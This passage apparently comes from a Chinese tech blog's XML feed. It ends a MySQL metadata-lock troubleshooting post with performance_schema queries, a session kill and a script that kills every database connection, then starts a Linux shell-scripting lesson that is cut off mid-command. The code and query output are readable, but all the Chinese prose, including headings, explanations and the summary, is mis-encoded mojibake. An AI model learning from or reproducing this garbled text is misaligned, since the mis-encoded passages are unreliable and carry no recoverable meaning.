0</span><br><span class="line">              SORT_SCAN: 0</span><br><span class="line">          NO_INDEX_USED: 0</span><br><span class="line">     NO_GOOD_INDEX_USED: 0</span><br><span class="line">       NESTING_EVENT_ID: NULL</span><br><span class="line">     NESTING_EVENT_TYPE: NULL</span><br><span class="line">    NESTING_EVENT_LEVEL: 0</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">ERROR: </span><br><span class="line">No query specified</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select THREAD_ID,DIGEST_TEXT from performance_schema.events_statements_current <span class="built_in">where</span> DIGEST_TEXT=<span class="string">"SELECT `abc` FROM `booboo`"</span>;</span></span><br><span class="line">+-----------+-----------------------------+</span><br><span class="line">| THREAD_ID | DIGEST_TEXT                 |</span><br><span class="line">+-----------+-----------------------------+</span><br><span class="line">|        40 | SELECT `abc` FROM `booboo`  |</span><br><span class="line">+-----------+-----------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from performance_schema.threads <span class="built_in">where</span> thread_id=40\G;</span></span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">          THREAD_ID: 40</span><br><span class="line">               NAME: thread/sql/one_connection</span><br><span class="line">               TYPE: FOREGROUND</span><br><span class="line">     PROCESSLIST_ID: 15</span><br><span class="line">   PROCESSLIST_USER: root</span><br><span class="line">   PROCESSLIST_HOST: localhost</span><br><span class="line">     PROCESSLIST_DB: uplooking</span><br><span class="line">PROCESSLIST_COMMAND: Sleep</span><br><span class="line">   PROCESSLIST_TIME: 402</span><br><span class="line">  PROCESSLIST_STATE: NULL</span><br><span class="line">   PROCESSLIST_INFO: NULL</span><br><span class="line">   PARENT_THREAD_ID: NULL</span><br><span class="line">               ROLE: NULL</span><br><span class="line">       INSTRUMENTED: YES</span><br><span class="line">            HISTORY: YES</span><br><span class="line">    CONNECTION_TYPE: Socket</span><br><span class="line">       THREAD_OS_ID: 22758</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select PROCESSLIST_ID from performance_schema.threads <span class="built_in">where</span> thread_id=40;</span></span><br><span class="line">+----------------+</span><br><span class="line">| PROCESSLIST_ID |</span><br><span class="line">+----------------+</span><br><span class="line">|             15 |</span><br><span class="line">+----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select * from information_schema.processlist <span class="built_in">where</span> id=(select PROCESSLIST_ID from performance_schema.threads <span class="built_in">where</span> thread_id=40);</span></span><br><span class="line">+----+------+-----------+-----------+---------+------+-------+------+</span><br><span class="line">| ID | USER | HOST      | DB        | COMMAND | TIME | STATE | INFO |</span><br><span class="line">+----+------+-----------+-----------+---------+------+-------+------+</span><br><span class="line">| 15 | root | localhost | uplooking | Sleep   |  466 |       | NULL |</span><br><span class="line">+----+------+-----------+-----------+---------+------+-------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> <span class="built_in">kill</span> 15;</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> ä¼šè¯B</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> alter table booboo add q9 int default 0;</span></span><br><span class="line">Query OK, 0 rows affected (9 min 54.35 sec)</span><br><span class="line">Records: 0  Duplicates: 0  Warnings: 0</span><br></pre></td></tr></table></figure><h2 id="å°çŸ¥è¯†ç‚¹æ€»ç»“"><a href="#å°çŸ¥è¯†ç‚¹æ€»ç»“" class="headerlink" title="å°çŸ¥è¯†ç‚¹æ€»ç»“"></a>å°çŸ¥è¯†ç‚¹æ€»ç»“</h2><h3 id="ä¸‰å¼ è¡¨çš„å…³ç³»"><a href="#ä¸‰å¼ è¡¨çš„å…³ç³»" class="headerlink" title="ä¸‰å¼ è¡¨çš„å…³ç³»"></a>ä¸‰å¼ è¡¨çš„å…³ç³»</h3><blockquote><p>MySQL 5.6</p></blockquote><ol><li><code>performance_schema</code>åº“ä¸­ï¼Œ<code>events_statements_current</code>è¡¨ä¸­<code>theard_id</code>ä¸<code>threads</code>è¡¨ä¸­çš„<code>thread_id</code>ç›¸åŒ</li><li><code>performance_schema</code>åº“ä¸­ï¼Œthreadsè¡¨ä¸­ï¼Œthread_idå’Œprocesslist_idä¸ºå¯¹åº”å…³ç³»ï¼Œ<code>thread_id</code>è¡¨ç¤ºä¸€ä¸ªç‹¬ç‰¹çš„çº¿ç¨‹æ ‡è¯†ç¬¦;<code>processlist_id</code>æ˜¯<code>show processlist</code>æ˜¾ç¤ºçš„<code>id</code>å€¼ï¼Œè¿æ¥æ ‡è¯†ç¬¦ï¼›è€Œå¯¹äºåå°çº¿ç¨‹(ä¸ç”¨æˆ·è¿æ¥ä¸ç›¸å…³çš„çº¿ç¨‹)ï¼Œ<code>PROCESSLIST_ID</code>ä¸ºç©ºï¼Œæ­¤å€¼ä¸æ˜¯å”¯ä¸€çš„ã€‚</li><li><code>information_schema</code>åº“ä¸­,<code>PROCESSLIST</code>è¡¨æ˜¯ä¸€ä¸ªéæ ‡å‡†è¡¨ã€‚<code>id</code>è¿æ¥æ ‡è¯†ç¬¦ï¼Œå¹¶ç”±CONNECTION_ID()å‡½æ•°è¿”å›ã€‚</li></ol><table><thead><tr><th>performance_schema</th><th>performance_schema</th><th>performance_schema</th><th>information_schema</th></tr></thead><tbody><tr><td>events_statements_current</td><td>threads</td><td>threads</td><td>processlist</td></tr><tr><td>THREAD_ID</td><td>THREAD_ID</td><td>PROCESSLIST_ID</td><td>ID</td></tr></tbody></table><h3 id="æˆ‘çš„ç†è§£"><a href="#æˆ‘çš„ç†è§£" class="headerlink" title="æˆ‘çš„ç†è§£"></a>æˆ‘çš„ç†è§£</h3><ol><li>çº¿ç¨‹è¡¨ä¸­ä¿å­˜äº†æ‰€æœ‰çº¿ç¨‹çš„ä¿¡æ¯ï¼Œæœ‰å‰å°çš„æœ‰åå°è¿è¡Œçš„ï¼›</li><li>å¦‚æœæ˜¯ç”±è¿æ¥äº§ç”Ÿçš„çº¿ç¨‹ï¼Œä¸€èˆ¬éƒ½æ˜¯å‰å°çº¿ç¨‹ï¼Œä¼šåˆ†é…ä¸€ä¸ªprocesslist_idï¼Œå¯ä»¥åœ¨information_schema.processlistä¸­çœ‹åˆ°</li></ol><h3 id="èµ„æ–™å‚è€ƒ"><a href="#èµ„æ–™å‚è€ƒ" class="headerlink" title="èµ„æ–™å‚è€ƒ"></a>èµ„æ–™å‚è€ƒ</h3><p><a href="https://dev.mysql.com/doc/refman/5.7/en/threads-table.html" target="_blank" rel="noopener">å®˜ç½‘å…³äºthreadsè¡¨çš„è¯´æ˜</a></p><p><a href="https://dev.mysql.com/doc/refman/5.7/en/show-processlist.html" target="_blank" rel="noopener">å®˜æ–¹å…³äºprocesslistè¡¨çš„è¯´æ˜</a></p><p><a href="http://www.voidcn.com/article/p-hjsjvnlz-bog.html" target="_blank" rel="noopener">MySQL5.7 MetaData Lock æ¡ˆä¾‹åˆ†äº«</a></p><h3 id="ä¸åŒç‰ˆæœ¬"><a href="#ä¸åŒç‰ˆæœ¬" class="headerlink" title="ä¸åŒç‰ˆæœ¬"></a>ä¸åŒç‰ˆæœ¬</h3><blockquote><p>MySQL 5.7</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">select * from performance_schema.events_statements_current\G</span><br><span class="line">select * from sys.x$session\G</span><br><span class="line">select * from sys.x$processlist\G</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from x$session\G;</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">                thd_id: 3904</span><br><span class="line">               conn_id: 3879</span><br><span class="line">                  user: root@localhost</span><br><span class="line">                    db: sys</span><br><span class="line">               command: Query</span><br><span class="line">                 state: Sending data</span><br><span class="line">                  time: 0</span><br><span class="line">     current_statement: select * from x$session</span><br><span class="line">     statement_latency: 1564453000</span><br><span class="line">              progress: NULL</span><br><span class="line">          lock_latency: 847000000</span><br><span class="line">         rows_examined: 0</span><br><span class="line">             rows_sent: 0</span><br><span class="line">         rows_affected: 0</span><br><span class="line">            tmp_tables: 4</span><br><span class="line">       tmp_disk_tables: 1</span><br><span class="line">             full_scan: YES</span><br><span class="line">        last_statement: NULL</span><br><span class="line">last_statement_latency: NULL</span><br><span class="line">        current_memory: 0</span><br><span class="line">             last_wait: NULL</span><br><span class="line">     last_wait_latency: NULL</span><br><span class="line">                source: NULL</span><br><span class="line">           trx_latency: NULL</span><br><span class="line">             trx_state: NULL</span><br><span class="line">        trx_autocommit: NULL</span><br><span class="line">                   pid: 12880</span><br><span class="line">          program_name: mysql</span><br><span class="line">1 row in set (0.05 sec)</span><br><span class="line">mysql&gt; select * from  x$processlist limit 1\G;</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">                thd_id: 1</span><br><span class="line">               conn_id: NULL</span><br><span class="line">                  user: sql&#x2F;main</span><br><span class="line">                    db: NULL</span><br><span class="line">               command: NULL</span><br><span class="line">                 state: NULL</span><br><span class="line">                  time: 230927</span><br><span class="line">     current_statement: NULL</span><br><span class="line">     statement_latency: NULL</span><br><span class="line">              progress: NULL</span><br><span class="line">          lock_latency: NULL</span><br><span class="line">         rows_examined: NULL</span><br><span class="line">             rows_sent: NULL</span><br><span class="line">         rows_affected: NULL</span><br><span class="line">            tmp_tables: NULL</span><br><span class="line">       tmp_disk_tables: NULL</span><br><span class="line">             full_scan: NO</span><br><span class="line">        last_statement: NULL</span><br><span class="line">last_statement_latency: NULL</span><br><span class="line">        current_memory: 0</span><br><span class="line">             last_wait: NULL</span><br><span class="line">     last_wait_latency: NULL</span><br><span class="line">                source: NULL</span><br><span class="line">           trx_latency: NULL</span><br><span class="line">             trx_state: NULL</span><br><span class="line">        trx_autocommit: NULL</span><br><span class="line">                   pid: NULL</span><br><span class="line">          program_name: NULL</span><br><span class="line">1 row in set (0.06 sec)</span><br><span class="line">mysql&gt; select * from information_schema.processlist;</span><br><span class="line">+------+------+-----------+------+---------+------+-----------+----------------------------------------------+</span><br><span class="line">| ID   | USER | HOST      | DB   | COMMAND | TIME | STATE     | INFO                                         |</span><br><span class="line">+------+------+-----------+------+---------+------+-----------+----------------------------------------------+</span><br><span class="line">| 3879 | root | localhost | sys  | Query   |    0 | executing | select * from information_schema.processlist |</span><br><span class="line">+------+------+-----------+------+---------+------+-----------+----------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="MDLæ•…éšœè‡ªæ„ˆ"><a href="#MDLæ•…éšœè‡ªæ„ˆ" class="headerlink" title="MDLæ•…éšœè‡ªæ„ˆ"></a>MDLæ•…éšœè‡ªæ„ˆ</h2><h3 id="killæ‰€æœ‰ä¼šè¯"><a href="#killæ‰€æœ‰ä¼šè¯" class="headerlink" title="killæ‰€æœ‰ä¼šè¯"></a>killæ‰€æœ‰ä¼šè¯</h3><blockquote><p>ä¸æƒ³çŸ¥é“æ•…éšœåŸå› ï¼Œåªæƒ³å¿«é€Ÿè§£å†³æ•…éšœ</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">kill</span>æ‰ æ‰€æœ‰ä¼šè¯</span></span><br><span class="line">user=xxx</span><br><span class="line">password=xxx</span><br><span class="line">host=xxxx.mysql.rds.aliyuncs.com</span><br><span class="line">port=3306</span><br><span class="line"></span><br><span class="line">mysql -u$user -p$password -h$host  -P$port -e "select  concat('KILL ',id,';') from information_schema.processlist;" &gt; tmpfile</span><br><span class="line"></span><br><span class="line">awk '&#123;if (NR != 1) print $0 &#125;' tmpfile | mysql -u$user -p$password -h$host  -P$port</span><br></pre></td></tr></table></figure><h3 id="MDLæ•…éšœæ’æŸ¥å’Œè§£å†³"><a href="#MDLæ•…éšœæ’æŸ¥å’Œè§£å†³" class="headerlink" title="MDLæ•…éšœæ’æŸ¥å’Œè§£å†³"></a>MDLæ•…éšœæ’æŸ¥å’Œè§£å†³</h3><p><a href="https://github.com/BoobooWei/DevOps-Database-Troubleshooting/blob/master/fault_self_healing_metadatalock.py" target="_blank" rel="noopener">MDLæ•…éšœè‡ªæ„ˆè„šæœ¬GitHubåœ°å€</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æ‘˜è¦ï¼šMetaData Lockå³å…ƒæ•°æ®é”ï¼Œåœ¨æ•°æ®åº“ä¸­å…ƒæ•°æ®å³æ•°æ®å­—å…¸ä¿¡æ¯åŒ…æ‹¬db,table,function,procedure,trigger,eventç­‰ã€‚metadata lockä¸»è¦ä¸ºäº†ä¿è¯å…ƒæ•°æ®çš„ä¸€è‡´æ€§,ç”¨äºå¤„ç†ä¸åŒçº¿ç¨‹æ“ä½œåŒä¸€æ•°æ®å¯¹è±¡çš„åŒæ­¥ä¸äº’æ–¥é—®é¢˜ã€‚&lt;/p&gt;
&lt;p&gt;ä»Šå¤©æœ‰å®¢æˆ·(MySQL 5.6)é‡åˆ°è¯¥é—®é¢˜ï¼Œæœ€å…³é”®çš„æ˜¯å±äºç¬¬ä¸‰ç§æƒ…å†µï¼Œgoogleä¸Šæ ¹æœ¬æ‰¾ä¸åˆ°ç±»ä¼¼çš„æ•…éšœæ¡ˆä¾‹ï¼Œå”¯ä¸€ä¸€ä¸ªéå¸¸æ¥è¿‘çš„æ•…éšœæ¡ˆä¾‹ä¸­æ•°æ®åº“ç‰ˆæœ¬å´ä¸åŒï¼ˆå…·ä½“çœ‹ä¸‹æ–‡æ…¢æ…¢èŠï¼‰ï¼Œå“ï¼Œå›°éš¾é‡é‡å•Šï¼Œæœ€ç»ˆè¿˜æ˜¯è§£å†³äº†å“ˆã€‚&lt;/p&gt;
&lt;p&gt;alter tableçš„è¯­å¥æ˜¯å¾ˆå±é™©çš„ï¼Œåœ¨æ“ä½œä¹‹å‰æœ€å¥½ç¡®è®¤å¯¹è¦æ“ä½œçš„è¡¨æ²¡æœ‰ä»»ä½•è¿›è¡Œä¸­çš„æ“ä½œã€æ²¡æœ‰æœªæäº¤äº‹åŠ¡ã€ä¹Ÿæ²¡æœ‰æ˜¾å¼äº‹åŠ¡ä¸­çš„æŠ¥é”™è¯­å¥ã€‚å¦‚æœæœ‰alter tableçš„ç»´æŠ¤ä»»åŠ¡ï¼Œåœ¨æ— äººç›‘ç®¡çš„æ—¶å€™è¿è¡Œï¼Œæœ€å¥½é€šè¿‡lock_wait_timeoutè®¾ç½®å¥½è¶…æ—¶æ—¶é—´ï¼Œé¿å…é•¿æ—¶é—´çš„metedataé”ç­‰å¾…ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="æŠ€æœ¯å¹¿è§’" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/"/>
    
      <category term="MySQL" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%B9%BF%E8%A7%92/MySQL/"/>
    
    
      <category term="é”æ•…éšœ" scheme="http://www.toberoot.com/tags/%E9%94%81%E6%95%85%E9%9A%9C/"/>
    
  </entry>
  
  <entry>
    <title>LINUX Shell Scripts ç¬¬ä¸€è¯¾ ç®€ä»‹å’Œå˜é‡</title>
    <link href="http://www.toberoot.com/2016/12/23/booboo_bash_shell_scripts/00_shell_variables/"/>
    <id>http://www.toberoot.com/2016/12/23/booboo_bash_shell_scripts/00_shell_variables/</id>
    <published>2016-12-22T21:06:27.000Z</published>
    <updated>2020-03-24T05:17:54.748Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æ•™å­¦ç¯å¢ƒä»‹ç»"><a href="#æ•™å­¦ç¯å¢ƒä»‹ç»" class="headerlink" title="æ•™å­¦ç¯å¢ƒä»‹ç»"></a>æ•™å­¦ç¯å¢ƒä»‹ç»</h2><ul><li>client rhel7.2 172.25.0.10</li><li>server rhel7.2 172.25.0.11</li></ul><p>å¦‚æœçœŸçš„æƒ³èµ°ITè¿™æ¡è·¯ï¼Œæƒ³çœŸæ­£ç®¡ç†å¥½ä½ çš„ä¸»æœºï¼Œé‚£ä¹ˆå­¦ä¹ è‡ªåŠ¨åŒ–ç®¡ç†å·¥å…·Shell Scripts éå¸¸é‡è¦ï¼</p><p>å°±æ˜¯å°†ä¸€äº›å‘½ä»¤æ”¾åœ¨ä¸€èµ·å»æ‰§è¡Œï¼Œå¹¶ä¸”ä¸éœ€è¦ç¼–è¯‘å°±èƒ½æ‰§è¡Œï¼Œå¾ˆæ–¹ä¾¿ï¼Œæ‰€ä»¥åœ¨æ—¥å¸¸å·¥ä½œä¸­å¯ä»¥ç”¨shell scriptsæ¥ç®€åŒ–æˆ‘ä»¬çš„ç®¡ç†ã€‚å¯ä»¥ä½†åˆ°æˆ‘ä»¬linuxä¸­ï¼Œå¾ˆå¤šæœåŠ¡çš„å¯åŠ¨éƒ½æ˜¯é€è¿‡shellè„šæœ¬æ¥å¯åŠ¨çš„ã€‚</p><p>å¦‚æœä½ ä¸ä¼šè„šæœ¬ï¼Œé‚£ä¹ˆæœåŠ¡å™¨å‡ºé—®é¢˜çš„æ—¶å€™ï¼ŒçœŸçš„ä¼šæ±‚åŠ©æ— é—¨ï¼Œæ‰€ä»¥å¥½å¥½åœ°å­¦ä¹ å§ï¼</p><h2 id="shell-ç®€ä»‹"><a href="#shell-ç®€ä»‹" class="headerlink" title="shell ç®€ä»‹"></a>shell ç®€ä»‹</h2><h3 id="ä»€ä¹ˆæ˜¯-shell"><a href="#ä»€ä¹ˆæ˜¯-shell" class="headerlink" title="ä»€ä¹ˆæ˜¯ shell"></a>ä»€ä¹ˆæ˜¯ shell</h3><p>Shell æ˜¯ä¸€ä¸ªå‘½ä»¤è§£é‡Šå™¨ , æ˜¯äººä¸æ“ä½œç³»ç»Ÿä¹‹é—´çš„æ¡¥æ¢ã€‚</p><p><img src="pic/03.png" alt="03.png"></p><p>æˆ‘ä»¬å¹³æ—¶æ— è®ºä»»ä½•æ“ä½œ , æœ€ç»ˆéƒ½è¦æ“ä½œç¡¬ä»¶ , æ¯”å¦‚è¾“å…¥ä¸€ä¸ªå­—ç¬¦ â€œ a â€, é‚£ä¹ˆä¿¡å· é¦–å…ˆä¼šä»é”®ç›˜ä¼ é€’åˆ°ä¸»æ¿ , é€šè¿‡ä¸»æ¿æ€»çº¿ä¼ é€’åˆ°å†…å­˜ ,CPU, æ˜¾å¡ç­‰ , æœ€ç»ˆç»è¿‡æ˜¾å¡çš„è¿ ç®—å®Œæˆååœ¨å±å¹•çš„æŸä¸ªä½ç½® , æ˜¾ç¤ºä¸€ä¸ªç‰¹å®šå­—ä½“çš„å­—ç¬¦ â€œa â€, è¿™ä¸€æ•´ä¸ªè¿‡ç¨‹å¯ä»¥è¯´æ˜¯ ä¸æ–­çš„å’Œç¡¬ä»¶æ‰“äº¤é“äº† , ä½†æ˜¯å¦‚æœè®©äººå»å‘é€è¿™äº›ç¡¬ä»¶æ“ä½œç æ˜¾ç„¶ä¸é€‚åˆ , å› ä¸ºè¿™ä¸æ˜¯äººå¹² çš„äº‹ , æ‰€ä»¥æˆ‘ä»¬æœ‰äº†æ“ä½œç³»ç»Ÿ , æ“ä½œç³»ç»Ÿé€šè¿‡åŠ è½½ä¸€å®šçš„ç¡¬ä»¶é©±åŠ¨ , ä»è€Œæ§åˆ¶ç¡¬ä»¶ , æ“ä½œç¡¬ ä»¶ , é‚£å‰©ä¸‹çš„äº‹å°±æ˜¯å¦‚ä½•å’Œæ“ä½œç³»ç»Ÿé€šä¿¡äº† , å¯¹äºæ™®é€šçš„ç³»ç»Ÿç®¡ç†å‘˜æ¥è¯´ , è¿™ä¹Ÿæ˜¯ä¸€ä»¶éå¸¸ å›°éš¾çš„äº‹ , ä¸ºäº†æ–¹ä¾¿äººå’Œæ“ä½œç³»ç»Ÿæ²Ÿé€š , æˆ‘ä»¬å¼€å‘äº† shell ã€‚</p><p>Shell å¯ä»¥å°†æˆ‘ä»¬å¹³æ—¶è¿è¡Œçš„ä¸€äº›æŒ‡ä»¤è§£é‡Šç»™æ“ä½œç³»ç»Ÿæ‰§è¡Œ , æ–¹ä¾¿ç®¡ç†å‘˜æ“ä½œç³»ç»Ÿã€‚ è€Œ Shell çš„è„šæœ¬å…¶å®æ˜¯ä¸€ç§å‘½ä»¤çš„å †ç§¯ , æˆ‘ä»¬å°†æ‰€æœ‰éœ€è¦æ‰§è¡Œçš„å‘½ä»¤ , ä»¥ä»ä¸Šè‡³ä¸‹çš„æ–¹ å¼å†™åœ¨ä¸€ä¸ªæ–‡ä»¶å½“ä¸­ , äº¤ç»™ shell å»è‡ªåŠ¨è§£é‡Šæ‰§è¡Œã€‚</p><h3 id="shell-å†å²"><a href="#shell-å†å²" class="headerlink" title="shell å†å²"></a>shell å†å²</h3><p>åœ¨ AT&amp;T çš„ Dennis Ritchie å’Œ Ken Thompson è®¾è®¡ UNIXTM çš„æ—¶å€™ , ä»–ä»¬æƒ³è¦ä¸º ç”¨æˆ·åˆ›å»ºä¸€ç§ä¸ä»–ä»¬çš„æ–°ç³»ç»Ÿäº¤æµçš„æ–¹æ³•ã€‚ é‚£æ—¶çš„æ“ä½œç³»ç»Ÿå¸¦æœ‰å‘½ä»¤è§£é‡Šå™¨ã€‚å‘½ä»¤è§£é‡Šå™¨æ¥å—ç”¨æˆ·çš„å‘½ä»¤ , ç„¶åè§£é‡Šå®ƒä»¬ , å› è€Œè®¡ ç®—æœºå¯ä»¥ä½¿ç”¨è¿™äº›å‘½ä»¤ã€‚</p><p>ä½†æ˜¯ Ritchie å’Œ Thompson æƒ³è¦çš„ä¸åªæ˜¯è¿™äº›åŠŸèƒ½ , ä»–ä»¬æƒ³æä¾›æ¯”å½“æ—¶çš„å‘½ä»¤è§£é‡Šå™¨ å…·å¤‡æ›´ä¼˜å¼‚åŠŸèƒ½çš„å·¥å…·ã€‚è¿™å¯¼è‡´äº† Bourne shell( é€šç§°ä¸º sh) çš„å¼€å‘ , ç”± S.R. Bourne åˆ› å»ºã€‚è‡ªä» Bourne shell çš„åˆ›å»º , å…¶å®ƒ shell ä¹Ÿè¢«ä¸€ä¸€å¼€å‘ , å¦‚ C shell(csh) å’Œ Korn shell(ksh) ã€‚</p><p>å½“è‡ªç”±è½¯ä»¶åŸºé‡‘ä¼šæƒ³å¯»æ±‚ä¸€ç§å…è´¹çš„ shell, å¼€å‘è€…ä»¬å¼€å§‹è‡´åŠ›äº Bourne shell ä»¥åŠå½“ æ—¶å…¶å®ƒ shell ä¸­æŸäº›å¾ˆå—æ¬¢è¿çš„åŠŸèƒ½èƒŒåçš„è¯­è¨€ã€‚</p><p>è¿™ä¸ªå¼€å‘ç»“æœæ˜¯ Bourne Again Shell, æˆ–ç§° bash ã€‚è™½ç„¶ä½ çš„ Red Hat Linux åŒ…æ‹¬å‡  ç§ä¸åŒçš„ shell,bash æ˜¯ä¸ºäº’åŠ¨ç”¨æˆ·æä¾›çš„é»˜è®¤ shell ã€‚</p><h3 id="å¸¸è§çš„-shell"><a href="#å¸¸è§çš„-shell" class="headerlink" title="å¸¸è§çš„ shell"></a>å¸¸è§çš„ shell</h3><ul><li>Bourne shell å³ sh:AT&amp;T è´å°”å®éªŒå®¤ç¼–å†™çš„ä¸€ä¸ªäº¤æ¢å¼çš„å‘½ä»¤è§£é‡Šå™¨ã€‚</li><li>C Shell :Bill Joy äº 20 ä¸–çºª 80 å¹´ä»£æ—©æœŸå¼€å‘ã€‚ä¸ºäº†è®©ç”¨æˆ·æ›´å®¹æ˜“çš„ä½¿ç”¨ , ä»–æŠŠè¯­æ³• ç»“æ„å˜æˆäº† C è¯­è¨€é£æ ¼ã€‚å®ƒæ–°å¢äº†å‘½ä»¤å†å²ã€åˆ«åã€æ–‡ä»¶åæ›¿æ¢ã€ä½œä¸šæ§åˆ¶ç­‰åŠŸèƒ½ã€‚</li><li>korn shell (ksh) æ˜¯ä¸€ä¸ª Unix shell ã€‚å®ƒç”±è´å°”å®éªŒå®¤çš„ David Korn åœ¨äºŒåä¸–çºªå…«å å¹´ä»£æ—©æœŸç¼–å†™ã€‚å®ƒå®Œå…¨å‘ä¸Šå…¼å®¹ Bourne shell å¹¶åŒ…å«äº† C shell çš„å¾ˆå¤šç‰¹æ€§ã€‚</li><li>Bourne-Again Shell: bash æ˜¯ä¸€ä¸ªä¸º GNU é¡¹ç›®ç¼–å†™çš„ Unix shell ã€‚å®ƒçš„åå­—æ˜¯ä¸€ ç³»åˆ—ç¼©å†™ :Bourne-Again SHell â€” è¿™æ˜¯å…³äº Bourne shell(sh) çš„ä¸€ä¸ªåŒå…³è¯­ (Bourne again / born again) ã€‚ Bourne shell æ˜¯ä¸€ä¸ªæ—©æœŸçš„é‡è¦ shell, ç”± Stephen Bourne åœ¨ 1978 å¹´å‰åç¼–å†™ , å¹¶åŒ Version 7 Unix ä¸€èµ·å‘å¸ƒã€‚ bash åˆ™åœ¨1987 å¹´ç”± Brian Fox åˆ›é€ ã€‚ åœ¨ 1990 å¹´ ,Chet Ramey æˆä¸ºäº†ä¸»è¦çš„ç»´æŠ¤è€…ã€‚ bash æ˜¯å¤§å¤šæ•° Linux ç³»ç»Ÿä»¥åŠ Mac OS X v10.4 é»˜è®¤çš„ shell, å®ƒèƒ½è¿è¡Œäºå¤§å¤šæ•° Unix é£æ ¼çš„æ“ä½œç³»ç»Ÿä¹‹ä¸Š , ç”šè‡³è¢«ç§»æ¤åˆ°äº† MicrosoftWindows ä¸Šçš„ Cygwin å’Œ MSYS ç³»ç»Ÿä¸­ , ä»¥å®ç° windows çš„ POSIX è™šæ‹Ÿæ¥å£ã€‚æ­¤å¤– , å®ƒä¹Ÿè¢« DJGPP é¡¹ç›®ç§»æ¤åˆ°äº† MS- DOS ä¸Šã€‚</li><li>POSIX shell :POSIX shell ä¸ Korn shell éå¸¸çš„ç›¸ä¼¼ , å½“å‰æä¾› POSIX shell çš„æœ€ å¤§å–ä¸»æ˜¯ Hewlett-Packard ã€‚</li></ul><h3 id="ä¸ºä»€ä¹ˆ-Shell"><a href="#ä¸ºä»€ä¹ˆ-Shell" class="headerlink" title="ä¸ºä»€ä¹ˆ Shell"></a>ä¸ºä»€ä¹ˆ Shell</h3><ul><li>è§£å†³é‡å¤æ“ä½œçš„ä½œä¸šã€‚</li><li>èŠ‚çº¦æ—¶é—´ , æé«˜å·¥ä½œæ•ˆç‡ã€‚</li><li>åŠŸèƒ½å¼ºå¤§ , ä½¿ç”¨ç®€å•ã€‚</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.æŸ¥çœ‹ç³»ç»Ÿå½“ä¸­åˆæ³•çš„shell</span></span><br><span class="line">cat /etc/shells</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># /etc/shells: valid login shells</span></span><br><span class="line">    /bin/sh</span><br><span class="line">    /bin/dash</span><br><span class="line">    /bin/bash</span><br><span class="line">    /bin/rbash</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 2.ä¿®æ”¹ç”¨æˆ·ç™»å½•æ—¶ä½¿ç”¨çš„shellç¨‹åº</span></span><br><span class="line">useradd batman</span><br><span class="line">chsh -s /bin/sh batman</span><br><span class="line">grep batman 